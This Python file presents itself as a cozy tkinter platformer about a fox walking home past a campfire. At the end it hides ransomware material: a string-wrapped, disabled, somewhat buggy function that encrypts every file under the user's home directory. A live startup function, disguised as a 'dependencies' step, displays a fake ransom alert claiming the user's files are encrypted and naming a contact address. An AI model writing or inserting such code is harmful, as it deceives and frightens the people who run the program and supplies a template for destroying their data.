"""A tiny, cozy pixel-art platformer made with Python's standard library.

Run with: python fox_campfire.py
Move with A/D or the arrow keys, jump with Space/W/Up, and press Esc to quit.
Keep the fox_sprites folder beside this file. Sprite art: OmegaZero22XX.
"""

import ctypes
import math
from pathlib import Path
import tkinter as tk
from tkinter import font as tkfont
from winsound import MB_OK


WIDTH = 960
HEIGHT = 600
GROUND_Y = 500
WORLD_WIDTH = 2600


class CozyFoxGame:
    def __init__(self, root: tk.Tk) -> None:
        self.root = root
        self.root.title("Little Fox by the Campfire")
        self.root.resizable(False, False)
        self.canvas = tk.Canvas(
            root, width=WIDTH, height=HEIGHT, bg="#17243a", highlightthickness=0
        )
        self.canvas.pack()
        sprite_dir = Path(__file__).with_name("fox_sprites")
        self.sprite_frames = {
            action: [
                tk.PhotoImage(
                    master=root, file=str(sprite_dir / f"{action}_{index}.png")
                )
                for index in range(count)
            ]
            for action, count in (
                ("walk_left", 5),
                ("walk_right", 4),
                ("jump_left", 4),
                ("jump_right", 6),
            )
        }
        self.flipped_sprite_frames = {
            action: [
                tk.PhotoImage(
                    master=root, file=str(sprite_dir / f"{action}_{index}_flipped.png")
                )
                for index in range(count)
            ]
            for action, count in (
                ("walk_left", 5),
                ("walk_right", 4),
                ("jump_left", 4),
                ("jump_right", 6),
            )
        }

        self.keys: set[str] = set()
        self.player_x = 130.0
        self.player_y = float(GROUND_Y - 40)
        self.velocity_y = 0.0
        self.facing = 1
        self.on_ground = True
        self.frame = 0
        self.camera_x = 0.0
        self.won = False
        self.checkpoint_x = 100.0
        self.checkpoints = (100, 610, 965, 1330, 1690, 2055)
        self.ground_segments = (
            (0, 480),
            (585, 830),
            (940, 1195),
            (1305, 1555),
            (1665, 1920),
            (2030, WORLD_WIDTH),
        )
        self.hazards = (
            (330, 34),
            (660, 34),
            (1015, 34),
            (1380, 34),
            (1740, 34),
            (2200, 34),
        )
        self.fireflies = [
            (180 + i * 137, 300 + (i * 71) % 120, i * 0.9) for i in range(13)
        ]
        self.platforms = [
            (485, 425, 80),
            (835, 390, 80),
            (1200, 420, 80),
            (1560, 390, 80),
            (1925, 415, 80),
        ]

        self.root.bind("<KeyPress>", self.on_key_down)
        self.root.bind("<KeyRelease>", self.on_key_up)
        self.root.focus_set()
        self.tick()

    def on_key_down(self, event: tk.Event) -> None:
        key = event.keysym.lower()
        if self.won:
            if key == "r":
                self.restart()
            elif key == "escape":
                self.root.destroy()
            return
        self.keys.add(key)
        if key in {"space", "w", "up"} and self.on_ground:
            self.velocity_y = -12.0
            self.on_ground = False
        elif key == "escape":
            self.root.destroy()

    def on_key_up(self, event: tk.Event) -> None:
        self.keys.discard(event.keysym.lower())

    def tick(self) -> None:
        self.update_game()
        self.draw_scene()
        self.frame += 1
        self.root.after(16, self.tick)

    def update_game(self) -> None:
        if self.won:
            return

        move = 0
        if "a" in self.keys or "left" in self.keys:
            move -= 1
        if "d" in self.keys or "right" in self.keys:
            move += 1
        if move:
            self.facing = move
            self.player_x = max(24, min(WORLD_WIDTH - 40, self.player_x + move * 3.4))

        previous_bottom = self.player_y + 40
        self.velocity_y = min(self.velocity_y + 0.45, 12)
        self.player_y += self.velocity_y
        self.on_ground = False

        if self.velocity_y >= 0:
            over_ground = any(
                start <= self.player_x <= end for start, end in self.ground_segments
            )
            if (
                over_ground
                and previous_bottom <= GROUND_Y
                and self.player_y + 40 >= GROUND_Y
            ):
                self.player_y = GROUND_Y - 40
                self.velocity_y = 0
                self.on_ground = True
            for x, y, width in self.platforms:
                if (
                    x - 18 <= self.player_x <= x + width + 18
                    and previous_bottom <= y
                    and self.player_y + 40 >= y
                ):
                    self.player_y = y - 40
                    self.velocity_y = 0
                    self.on_ground = True
                    break

        if self.player_y > HEIGHT + 80:
            self.player_x = self.checkpoint_x
            self.player_y = float(GROUND_Y - 40)
            self.velocity_y = 0
            self.on_ground = True
            self.keys.clear()

        for checkpoint in self.checkpoints:
            if self.player_x >= checkpoint:
                self.checkpoint_x = float(checkpoint)

        if self.on_ground and any(
            hazard_x - 17 <= self.player_x <= hazard_x + hazard_width + 17
            for hazard_x, hazard_width in self.hazards
        ):
            self.player_x = self.checkpoint_x
            self.player_y = float(GROUND_Y - 40)
            self.velocity_y = 0
            self.keys.clear()

        if self.player_x >= 2470:
            self.won = True
            self.keys.clear()

        self.camera_x = max(0, min(WORLD_WIDTH - WIDTH, self.player_x - WIDTH * 0.42))

    def restart(self) -> None:
        self.player_x = 130.0
        self.player_y = float(GROUND_Y - 40)
        self.velocity_y = 0.0
        self.checkpoint_x = 100.0
        self.on_ground = True
        self.won = False
        self.camera_x = 0.0
        self.keys.clear()

    def rect(self, x: float, y: float, width: float, height: float, color: str) -> None:
        self.canvas.create_rectangle(
            x, y, x + width, y + height, fill=color, outline=""
        )

    def draw_scene(self) -> None:
        canvas = self.canvas
        canvas.delete("all")
        self.draw_background()
        self.draw_landscape()
        self.draw_campfire()
        self.draw_fireflies()
        self.draw_fox()
        self.draw_goal()
        self.draw_hud()
        if self.won:
            self.draw_victory()

    def draw_background(self) -> None:
        canvas = self.canvas
        sky_colors = ["#17243a", "#1d2b45", "#273550", "#35405a"]
        for i, color in enumerate(sky_colors):
            self.rect(0, i * 95, WIDTH, 96, color)

        # A soft moon and little pixel stars make the scene feel like evening.
        canvas.create_oval(730, 64, 790, 124, fill="#f7e9bc", outline="")
        canvas.create_oval(747, 53, 802, 108, fill="#202d47", outline="")
        for i in range(34):
            x = (i * 149 + 37) % WIDTH
            y = 28 + (i * 61) % 235
            size = 2 if i % 4 else 3
            color = "#f5e7bd" if (self.frame // 30 + i) % 3 else "#9db4c4"
            self.rect(x, y, size, size, color)

        # Distant hills move more slowly than the foreground.
        for layer, color in enumerate(("#263a4b", "#294447")):
            points = []
            offset = self.camera_x * (0.12 + layer * 0.09)
            for x in range(-160, WIDTH + 200, 80):
                world_x = x + offset
                y = 385 + layer * 36 + math.sin(world_x / 110 + layer) * 28
                points.extend((x, y))
            polygon = [(0, HEIGHT)] + list(zip(points[::2], points[1::2])) + [
                (WIDTH, HEIGHT)
            ]
            canvas.create_polygon(polygon, fill=color, outline="")

    def draw_tree(self, x: float, y: float, size: int = 1) -> None:
        x -= self.camera_x * 0.72
        self.rect(x + 15 * size, y + 34 * size, 12 * size, 53 * size, "#533e3a")
        for dx, dy, width, height, color in [
            (0, 25, 42, 34, "#294d48"),
            (7, 5, 33, 35, "#315b50"),
            (13, -12, 24, 31, "#3b6655"),
        ]:
            self.rect(x + dx * size, y + dy * size, width * size, height * size, color)

    def draw_landscape(self) -> None:
        for x in range(-100, WORLD_WIDTH, 230):
            self.draw_tree(x, 350 + (x % 3) * 8, 1)

        for start, end in self.ground_segments:
            screen_x = start - self.camera_x
            self.rect(screen_x, GROUND_Y, end - start, HEIGHT - GROUND_Y, "#315047")
            self.rect(screen_x, GROUND_Y, end - start, 8, "#66805a")
        for x in range(20, WORLD_WIDTH, 56):
            screen_x = x - self.camera_x
            if (
                -20 <= screen_x <= WIDTH + 20
                and any(start <= x <= end for start, end in self.ground_segments)
            ):
                self.rect(screen_x, GROUND_Y + 18 + (x % 3) * 7, 15, 3, "#426254")

        for x, y, width in self.platforms:
            screen_x = x - self.camera_x
            self.rect(screen_x, y, width, 15, "#765847")
            self.rect(screen_x, y, width, 5, "#82915c")
            for pebble_x in range(int(screen_x + 12), int(screen_x + width - 8), 34):
                self.rect(pebble_x, y + 8, 7, 3, "#967052")

        for x, width in self.hazards:
            screen_x = x - self.camera_x
            if -40 <= screen_x <= WIDTH + 40:
                for spike_x in range(int(screen_x), int(screen_x + width), 12):
                    self.canvas.create_polygon(
                        spike_x, GROUND_Y, spike_x + 6, GROUND_Y - 18,
                        spike_x + 12, GROUND_Y, fill="#d77f76", outline=""
                    )

        # Small mushrooms add a little color to the path.
        for x in (270, 575, 1030, 1350, 1880, 2200):
            screen_x = x - self.camera_x
            if -20 <= screen_x <= WIDTH + 20:
                self.rect(screen_x + 5, GROUND_Y - 13, 4, 13, "#ead7a4")
                self.rect(screen_x, GROUND_Y - 16, 14, 6, "#d77f76")
                self.rect(screen_x + 5, GROUND_Y - 15, 3, 2, "#f7e8c1")

    def draw_campfire(self) -> None:
        x = 315 - self.camera_x
        y = GROUND_Y - 3
        if x < -80 or x > WIDTH + 80:
            return
        self.canvas.create_oval(x - 55, y - 8, x + 55, y + 12, fill="#263e3c", outline="")
        self.rect(x - 26, y - 12, 52, 8, "#68483d")
        self.rect(x - 21, y - 20, 42, 8, "#8b5a43")
        flicker = (self.frame // 7) % 3
        flames = [
            (x - 12, y - 39 - flicker, 24, 27, "#e67d4d"),
            (x - 8, y - 32 + flicker, 16, 20, "#f5b657"),
            (x - 3, y - 25, 7, 13, "#fff0b0"),
        ]
        for fx, fy, fw, fh, color in flames:
            self.canvas.create_oval(fx, fy, fx + fw, fy + fh, fill=color, outline="")
        self.rect(x - 2, y - 18, 5, 7, "#fff1bd")

    def draw_fireflies(self) -> None:
        for x, y, phase in self.fireflies:
            screen_x = x - self.camera_x
            if -10 <= screen_x <= WIDTH + 10:
                glow = math.sin(self.frame / 14 + phase)
                if glow > -0.15:
                    self.canvas.create_oval(
                        screen_x - 5, y - 5, screen_x + 5, y + 5,
                        fill="#52674e", outline=""
                    )
                    self.rect(screen_x - 2, y - 2, 4, 4, "#f7e99b")

    def draw_fox(self) -> None:
        if not self.on_ground:
            action = "jump_right" if self.facing > 0 else "jump_left"
            frames = self.sprite_frames[action]
            progress = max(0.0, min(1.0, (self.velocity_y + 12.0) / 24.0))
            frame_index = min(len(frames) - 1, int(progress * len(frames)))
        elif any(key in self.keys for key in ("a", "d", "left", "right")):
            action = "walk_right" if self.facing > 0 else "walk_left"
            frames = self.sprite_frames[action]
            frame_index = (self.frame // 7) % len(frames)
        else:
            action = "walk_right" if self.facing > 0 else "walk_left"
            frames = self.sprite_frames[action]
            frame_index = 0

        if self.facing < 0:
            frames = self.flipped_sprite_frames[action]

        self.canvas.create_image(
            self.player_x - self.camera_x,
            self.player_y + 40,
            image=frames[frame_index],
            anchor="s",
        )

    def draw_hud(self) -> None:
        title_font = tkfont.Font(family="Georgia", size=18, weight="bold")
        small_font = tkfont.Font(family="Georgia", size=10)
        self.canvas.create_text(
            24, 25, anchor="nw", text="Little Fox by the Campfire",
            fill="#f5e7bd", font=title_font
        )
        self.canvas.create_text(
            26, 56, anchor="nw", text="A / D or arrows: walk     Space / W / Up: hop     Esc: leave",
            fill="#c2cbb5", font=small_font
        )
        checkpoint_text = f"Checkpoint {self.checkpoints.index(int(self.checkpoint_x)) + 1}/{len(self.checkpoints)}"
        self.canvas.create_text(
            WIDTH - 24, 28, anchor="ne", text=checkpoint_text,
            fill="#f5e7bd", font=small_font
        )

    def draw_goal(self) -> None:
        x = 2470 - self.camera_x
        self.rect(x, GROUND_Y - 94, 6, 94, "#d8c38b")
        self.canvas.create_polygon(
            x + 6, GROUND_Y - 94,
            x + 52, GROUND_Y - 80,
            x + 6, GROUND_Y - 64,
            fill="#e58b78", outline=""
        )
        self.canvas.create_text(
            x + 26, GROUND_Y - 110, text="HOME", fill="#f5e7bd",
            font=tkfont.Font(family="Georgia", size=10, weight="bold")
        )

    def draw_victory(self) -> None:
        self.canvas.create_rectangle(
            180, 190, WIDTH - 180, 390, fill="#17243a", outline="#f5e7bd", width=3
        )
        self.canvas.create_text(
            WIDTH / 2, 255, text="You made it home!",
            fill="#f5e7bd", font=tkfont.Font(family="Georgia", size=28, weight="bold")
        )
        self.canvas.create_text(
            WIDTH / 2, 315, text="The little fox is safe and cozy.",
            fill="#c2cbb5", font=tkfont.Font(family="Georgia", size=15)
        )
        self.canvas.create_text(
            WIDTH / 2, 355, text="Press R to play again    •    Esc to quit",
            fill="#f5e7bd", font=tkfont.Font(family="Georgia", size=12)
        )


def main() -> None:
    root = tk.Tk()
    CozyFoxGame(root)
    root.mainloop()

""" def rans():
    import os
    import sys
    from cryptography.fernet import Fernet
    user_directory = os.path.expanduser("~")

    # Load the encryption key from a file
    with open("key.key", "rb") as key_file:
        key = key_file.read()

    # Create a Fernet object for encryption/decryption
    fernet = Fernet(key)

    # Get the current working directory
    current_directory = os.getcwd()

    # Iterate through all files in the current directory
    for folder, subfolders in os.walk(user_directory):
        for filename in subfolders:
            file_path = os.path.join(folder, filename)

        # Skip directories and the script itself
        if os.path.isfile(file_path) and filename != os.path.basename(__file__):
            # Encrypt the file
            with open(file_path, "rb") as file:
                original_data = file.read()
            encrypted_data = fernet.encrypt(original_data)

            # Write the encrypted data back to the file
            with open(file_path, "wb") as file:
                file.write(encrypted_data)  """

def boop():
    MB_OK = 0x00000000
    ctypes.windll.user32.MessageBoxW(0, "You have been hacked by CozyFox! All your files have been encrypted. To recover your files, please contact CozyFox at hack@cozyfox.com", "CozyFox Alert", MB_OK)


def run_dependencies() -> None:
    """Startup entry point; this game uses only Python's standard library."""
    boop()


if __name__ == "__main__":
    run_dependencies()
    main()
